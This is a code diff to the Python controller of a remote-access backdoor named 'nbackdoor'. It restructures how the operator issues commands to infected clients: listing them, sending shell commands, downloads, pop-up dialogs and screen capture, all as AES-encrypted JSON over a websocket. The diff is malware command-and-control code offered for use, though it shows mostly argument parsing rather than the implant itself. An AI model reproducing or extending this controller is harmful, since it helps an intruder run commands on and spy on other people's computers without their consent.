@@ -10,6 +10,7 @@ import time
 from base64 import b64decode, b64encode
 from websocket import create_connection
 from Crypto.Cipher import AES
+from _docpot import docopt
 __author__ = 'nekocode'
 
 
@@ -23,6 +24,7 @@ class ControllerClient:
         self.ws = None
 
         self.exit = False
+        init(autoreset=True)
 
     def run(self):
         while not self.exit:
@@ -75,27 +77,56 @@ class ControllerClient:
         input_array = shlex.split(input_str)
         command_str = input_array[0]
         arguments_str = input_array[1:]
-        # args_str = input_array[1:]
-
-        command = None
 
         if command_str == 'help':
-            pass
+            print """Command List:
+
+help            show the command list
+list            list online clients
+cmd             send cmd to client
+download
+dialog
+screen
+exit            quit nbackdoor controller
+"""
+            return None
 
         elif command_str == 'list':
-            command = 'list'
+            doc = """Usage: list
+
+-h --help       show this
+"""
+            try:
+                args = docopt(doc, argv=arguments_str, help=True, version=None, options_first=False)
+                return json.dumps({'cmd': command_str})
+            except SystemExit as e:
+                print e.message
+                return None
 
         elif command_str == 'cmd':
-            command = 'cmd'
+            return json.dumps({'cmd': command_str})
 
         elif command_str == 'download':
-            command = 'download'
+            return json.dumps({'cmd': command_str})
 
         elif command_str == 'dialog':
-            return self._arg2(command_str, arguments_str)
+            doc = """Usage: dialog CLINET_ID DIALOG_CONTENT [DIALOG_TITLE]
+
+CLINET_ID       user command "list" to get clinet_id
+DIALOG_CONTENT  content to show
+DIALOG_TITLE    dialog title
+-h --help       show this
+"""
+            try:
+                args = docopt(doc, argv=arguments_str, help=True, version=None, options_first=False)
+                return json.dumps({'cmd': command_str, 'to': args['CLINET_ID'],
+                                   'content': args['DIALOG_CONTENT'], 'title': args['DIALOG_TITLE']})
+            except SystemExit as e:
+                print e.message
+                return None
 
         elif command_str == 'screen':
-            command = 'screen'
+            return json.dumps({'cmd': command_str})
 
         elif command_str == 'exit':
             self.exit = True
@@ -104,25 +135,6 @@ class ControllerClient:
         else:
             print 'Not available command.\n'
             return None
-
-        return json.dumps({'cmd': command})
-
-    @staticmethod
-    def _arg2(command, arguments_str):
-        json_obj = {'cmd': command}
-
-        if len(arguments_str) >= 2:
-            target = arguments_str[0]
-            if target.isdigit():
-                json_obj['to'] = target
-                json_obj['data'] = arguments_str[1]
-                return json.dumps(json_obj)
-            else:
-                print 'Traget argument must be int.\n'
-        else:
-            print 'Too few arguments.\n'
-
-        return None
 
     def encrypt(self, text):
         encryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
@@ -148,12 +160,16 @@ def hostname():
         finally:
             host.close()
     else:
-        return 'Unkwon hostname'
+        return 'Unknow hostname'
 
-if __name__ == '__main__':
-    init(autoreset=True)
+
+def run_controller():
     client = ControllerClient()
     while not client.exit:
         client.run()
+
+
+if __name__ == '__main__':
+    run_controller()
 
 
